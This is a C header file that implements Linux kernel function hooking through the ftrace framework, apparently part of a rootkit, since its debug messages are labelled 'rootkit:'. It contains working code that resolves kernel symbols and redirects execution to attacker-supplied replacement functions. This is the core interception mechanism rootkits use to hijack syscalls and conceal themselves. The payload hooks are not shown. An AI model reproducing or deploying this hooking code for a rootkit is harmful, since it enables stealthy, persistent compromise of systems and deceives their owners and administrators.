/*
 * Hooking kernel functions using ftrace framework
 *
 * Copyright (c) 2018 ilammy
 * 
 * Simplified 2021 Bao
 */

#pragma once

#include <asm/linkage.h>
#include <linux/ftrace.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/version.h>

#include "utility.h"

#if LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0)
#define FTRACE_OPS_FL_RECURSION FTRACE_OPS_FL_RECURSION_SAFE
#endif

struct ftrace_hook {
	const char *name;
	void *function;
	unsigned long address;
	struct ftrace_ops ops;
};

static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs)
{
	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
	if(!within_module(parent_ip, THIS_MODULE))
		regs->ip = (unsigned long) hook->function;
}

int fh_install_hook(struct ftrace_hook *hook)
{
	hook->address = lookup_name(hook->name);
    if (!hook->address)
        return -ENOENT;

	hook->ops.func = fh_ftrace_thunk;
	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
			| FTRACE_OPS_FL_RECURSION_SAFE
			| FTRACE_OPS_FL_IPMODIFY;

    int err;
	if ((err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0)))
	{
		printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
		return err;
	}

	if ((err = register_ftrace_function(&hook->ops)))
	{
		printk(KERN_DEBUG "rootkit: register_ftrace_function() failed: %d\n", err);
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
		return err;
	}

	return 0;
}

int fh_remove_hook(struct ftrace_hook *hook)
{
	int err;
	err = unregister_ftrace_function(&hook->ops);
	if(err)
	{
		printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
	}

	err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
	if(err)
	{
		printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
	}
    return err;
}

#define HOOK(_symbol, _function)    \
    {                               \
        .name = (_symbol),          \
        .function = (_function)     \
    }
